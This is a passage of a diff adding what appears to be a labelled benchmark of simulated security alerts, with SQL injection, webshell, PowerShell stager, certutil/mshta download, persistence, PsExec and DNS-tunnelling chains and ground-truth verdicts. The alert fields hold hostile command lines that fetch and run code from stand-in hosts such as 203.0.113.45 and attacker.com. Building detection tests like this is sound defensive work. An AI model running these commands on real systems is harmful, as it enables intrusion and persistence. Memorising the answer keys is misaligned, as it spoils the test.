+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:01:00Z",
+              "end": "2026-09-27T01:01:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-051:w1",
+          "rule_name": "SQL Injection Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:02:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "SQL Injection Strings In URI | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "status": "200",
+            "http_user_agent": "sqlmap/1.7.2",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-051:w2",
+          "rule_name": "Windows Webshell Strings",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:03:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Windows Webshell Strings | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/upload/shell.aspx?=whoami",
+            "status": "200",
+            "http_user_agent": "curl/7.68",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-051:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:04:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        },
+        {
+          "alert_id": "v2-051:n3",
+          "rule_name": "AegisSOC - Suricata Malware or C2 Communication Alert",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:05:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.45",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Malware or C2 Communication Alert | 192.168.56.20 -> 203.0.113.45:8080 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "http",
+            "alert": {
+              "signature": "ET MALWARE Possible C2 Beacon",
+              "signature_id": 2030002,
+              "category": "A Network Trojan was detected"
+            },
+            "flow": {
+              "pkts_toserver": 40,
+              "pkts_toclient": 40,
+              "bytes_toserver": 3200,
+              "bytes_toclient": 2800,
+              "start": "2026-09-27T01:05:00Z",
+              "end": "2026-09-27T01:05:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1046",
+          "T1595",
+          "T1190",
+          "T1505.003",
+          "T1071"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "Chuỗi 6 alert từ recon → SQLi → webshell → RCE → C2. Kill-chain đầy đủ. Từng rule đơn lẻ high/medium; tổng = critical."
+      }
+    },
+    {
+      "id": "v2-052",
+      "name": "Webshell + discovery + persistence",
+      "alerts": [
+        {
+          "alert_id": "v2-052:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:06:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        },
+        {
+          "alert_id": "v2-052:e2",
+          "rule_name": "Suspicious Execution of Systeminfo",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1082"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:07:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Execution of Systeminfo |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\systeminfo.exe",
+            "OriginalFileName": "sysinfo.exe",
+            "CommandLine": "systeminfo.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6125",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-052:e3",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:08:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-052:e4",
+          "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:09:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Creation Via Schtasks.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\temp\\upd.exe /sc onlogon",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6127",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1082",
+          "T1033",
+          "T1053.005"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "Webshell → discovery → persistence. 4 alert trong 4 phút."
+      }
+    },
+    {
+      "id": "v2-053",
+      "name": "PowerShell stager chain",
+      "alerts": [
+        {
+          "alert_id": "v2-053:e1",
+          "rule_name": "Usage Of Web Request Commands And Cmdlets",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:10:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Usage Of Web Request Commands And Cmdlets |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Invoke-WebRequest -Uri http://example.com",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6501",
+            "ParentProcessId": "5000"
+          }
+        },
+        {
+          "alert_id": "v2-053:e2",
+          "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:11:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious PowerShell Download and Execute Pattern |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/p.ps1')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6446",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-053:e3",
+          "rule_name": "Base64 Encoded PowerShell Command Detected",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1027",
+            "T1140",
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:12:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Base64 Encoded PowerShell Command Detected |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe [Convert]::FromBase64String('SQBFACAA')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6445",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1059.001",
+          "T1027",
+          "T1140"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "PS web request → download → base64 decode. Stager 3 bước."
+      }
+    },
+    {
+      "id": "v2-054",
+      "name": "LOLBAS download chain",
+      "alerts": [
+        {
+          "alert_id": "v2-054:e1",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:13:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-054:e2",
+          "rule_name": "File Decoded From Base64/Hex Via Certutil.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1027"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:14:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "File Decoded From Base64/Hex Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -decode C:\\temp\\enc.txt C:\\temp\\dec.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6221",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-054:e3",
+          "rule_name": "Remotely Hosted HTA File Executed Via Mshta.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1218.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:15:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Remotely Hosted HTA File Executed Via Mshta.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "OriginalFileName": "MSHTA.EXE",
+            "CommandLine": "mshta.exe http://203.0.113.45/payload.hta",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6223",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1027",
+          "T1105",
+          "T1218.005"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "certutil download → certutil decode → mshta exec. Chuỗi thực thi."
+      }
+    },
+    {
+      "id": "v2-055",
+      "name": "SQLi + upload webshell + RCE",
+      "alerts": [
+        {
+          "alert_id": "v2-055:w1",
+          "rule_name": "SQL Injection Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:16:00Z",
+          "src_ip": "203.0.113.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "SQL Injection Strings In URI | 203.0.113.77 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "status": "200",
+            "http_user_agent": "sqlmap/1.7.2",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-055:w2",
+          "rule_name": "Windows Webshell Strings",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:17:00Z",
+          "src_ip": "203.0.113.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Windows Webshell Strings | 203.0.113.77 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/upload/shell.aspx?=whoami",
+            "status": "200",
+            "http_user_agent": "curl/7.68",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-055:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:18:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1190",
+          "T1505.003"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "SQLi → gọi webshell → RCE. Chuỗi exploitation web kinh điển."
+      }
+    },
+    {
+      "id": "v2-056",
+      "name": "DNS tunneling nhiều bước",
+      "alerts": [
+        {
+          "alert_id": "v2-056:n1",
+          "rule_name": "Suspicious DNS Query with B64 Encoded String",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1048.003",
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:19:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Suspicious DNS Query with B64 Encoded String | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "cGF5bG9hZDE=.attacker.com",
+            "flow": {
+              "pkts_toserver": 5,
+              "pkts_toclient": 5,
+              "bytes_toserver": 400,
+              "bytes_toclient": 600,
+              "start": "2026-09-27T01:19:00Z",
+              "end": "2026-09-27T01:19:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-056:n2",
+          "rule_name": "DNS TXT Answer with Possible Execution Strings",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:20:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "DNS TXT Answer with Possible Execution Strings | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "cmd.example.com",
+            "record_type": "TXT",
+            "answer": "IEX (New-Object Net.WebClient)",
+            "flow": {
+              "pkts_toserver": 3,
+              "pkts_toclient": 3,
+              "bytes_toserver": 200,
+              "bytes_toclient": 500,
+              "start": "2026-09-27T01:20:00Z",
+              "end": "2026-09-27T01:20:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-056:n3",
+          "rule_name": "Cobalt Strike DNS Beaconing",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:21:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Cobalt Strike DNS Beaconing | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "aaa.stage.attacker.com",
+            "flow": {
+              "pkts_toserver": 50,
+              "pkts_toclient": 50,
+              "bytes_toserver": 5000,
+              "bytes_toclient": 5000,
+              "start": "2026-09-27T01:21:00Z",
+              "end": "2026-09-27T01:21:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1071.004",
+          "T1048.003"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "DNS b64 + TXT exec + Cobalt beacon. DNS là kênh chính."
+      }
+    },
+    {
+      "id": "v2-057",
+      "name": "Recon + lateral",
+      "alerts": [
+        {
+          "alert_id": "v2-057:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:22:00Z",
+          "src_ip": "203.0.113.77",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 445,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 203.0.113.77 -> 192.168.56.20:445 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:22:00Z",
+              "end": "2026-09-27T01:22:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-057:e1",
+          "rule_name": "Psexec Execution",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1569",
+            "T1021"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:23:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Psexec Execution |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Users\\Public\\psexec.exe",
+            "OriginalFileName": "psexec.c",
+            "CommandLine": "psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6130",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1046",
+          "T1595",
+          "T1569",
+          "T1021"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "Scan từ IP ngoài + PsExec tới host nội bộ bởi IIS APPPOOL. Recon + lateral."
+      }
+    },
+    {
+      "id": "v2-058",
+      "name": "Chuỗi hoàn chỉnh 8 bước",
+      "alerts": [
+        {
+          "alert_id": "v2-058:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 445,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 203.0.113.45 -> 192.168.56.20:445 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-058:w1",
+          "rule_name": "SQL Injection Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:01:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "SQL Injection Strings In URI | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "status": "200",
+            "http_user_agent": "sqlmap/1.7.2",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-058:w2",
+          "rule_name": "Windows Webshell Strings",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:02:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Windows Webshell Strings | 203.0.113.45 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/upload/shell.aspx?=whoami",
+            "status": "200",
+            "http_user_agent": "curl/7.68",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-058:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:03:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        },
+        {
+          "alert_id": "v2-058:e2",
+          "rule_name": "Suspicious Encoded PowerShell Command Line",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:04:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Encoded PowerShell Command Line |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "OriginalFileName": "PowerShell.EXE",
+            "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6444",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-058:e3",
+          "rule_name": "Base64 Encoded PowerShell Command Detected",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1027",
+            "T1140",
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:05:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Base64 Encoded PowerShell Command Detected |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe [Convert]::FromBase64String('SQBFACAA')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6445",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-058:e4",
+          "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1547.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:06:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Potential Persistence Attempt Via Run Keys Using Reg.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\temp\\x.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6129",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-058:n2",
+          "rule_name": "AegisSOC - Suricata Malware or C2 Communication Alert",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1071"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:07:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.45",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Malware or C2 Communication Alert | 192.168.56.20 -> 203.0.113.45:8080 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "http",
+            "alert": {
+              "signature": "ET MALWARE Possible C2 Beacon",
+              "signature_id": 2030002,
+              "category": "A Network Trojan was detected"
+            },
+            "flow": {
+              "pkts_toserver": 40,
+              "pkts_toclient": 40,
+              "bytes_toserver": 3200,
+              "bytes_toclient": 2800,
+              "start": "2026-09-27T01:07:00Z",
+              "end": "2026-09-27T01:07:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1046",
+          "T1190",
+          "T1505.003",
+          "T1059.001",
+          "T1027",
+          "T1547.001",
+          "T1071"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "8 bước: recon → SQLi → webshell → RCE → PS encoded → decode → persistence → C2. Kill-chain đầy đủ theo MITRE ATT&CK."
+      }
+    },
+    {
+      "id": "v2-059",
+      "name": "Webshell + credential dump + C2",
+      "alerts": [
+        {
+          "alert_id": "v2-059:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
